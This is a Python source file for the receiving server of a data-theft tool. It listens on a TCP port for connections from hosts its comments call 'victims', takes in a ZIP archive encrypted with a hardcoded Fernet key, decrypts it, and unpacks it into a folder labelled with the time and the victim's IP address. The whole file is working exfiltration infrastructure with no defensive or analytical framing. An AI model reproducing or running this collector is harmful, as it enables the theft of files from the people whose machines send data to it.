import socket, argparse, os, zipfile, io, datetime
from cryptography.fernet import Fernet

# Use argparse to appropriately and smoothly validate arguments
parser = argparse.ArgumentParser(allow_abbrev=False)

# Argparse method that ensures port is within valid range
def port(target):
	# Raises an error if single port is not an integer or valid port
	port = int(target)
	if port < 0 or port > 65535:
		raise ValueError
	return port

# Argparse method that ensures IPv4 target address argument is correctly formatted
def ip_address(target):
	byte1, byte2, byte3, byte4 = target.split(".")
	
	# Raise an error for non-integer arguments
	byte1 = int(byte1)
	byte2 = int(byte2)
	byte3 = int(byte3)
	byte4 = int(byte4)
	
	# Ensure values fall within valid byte range
	if (byte1 < 0 or byte1 > 255) or (byte2 < 0 or byte2 > 255) or (byte3 < 0 or byte3 > 255) or (byte4 < 0 or byte4 > 255):
		raise ValueError
	return target

# Add arguments to argparse
parser.add_argument('ip', type=ip_address, nargs=1, help='Specifies server IP address')
parser.add_argument('port', type=port, nargs=1, help='Specfies server port')

args=parser.parse_args()

# Create a TCP server socket with a queue of 5 clients/victims
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((args.ip[0], args.port[0]))
sock.listen(5)

while True:
	# Accept victim connection and create buffer to store data
	victim_sock, addr = sock.accept()
	zf_data = b''
	try:	
		# Listen for victim data until socket empty. Copy data into above buffer
		while True:
        		data = victim_sock.recv(4096)
        		if not data:
        			break
        		zf_data += data
		
		# After entire ZIP is retrieve, decrpyt the ZIP using the shared key
		key = b'rfxRvXZ1FTB8XdCew9-BwGnb65iCiXGGo6TzH67KfZg='
		fernet = Fernet(key)
		decrypted_zf = fernet.decrypt(zf_data)
		
		# Create a new directory in the current directory in the format "DateTime:Victim_IP"
		dir_name = str(datetime.datetime.now()) + "_" + addr[0]
		dir_path = os.path.join('.', dir_name)
		os.mkdir(dir_path)			
		
		# Extract decrypted ZIP to above directory
		with zipfile.ZipFile(io.BytesIO(decrypted_zf), 'r') as zip_ref:
			zip_ref.extractall(dir_path)
	except Exception as e:
		print(f"Error receivng zip file data: {e}")
	victim_sock.close()
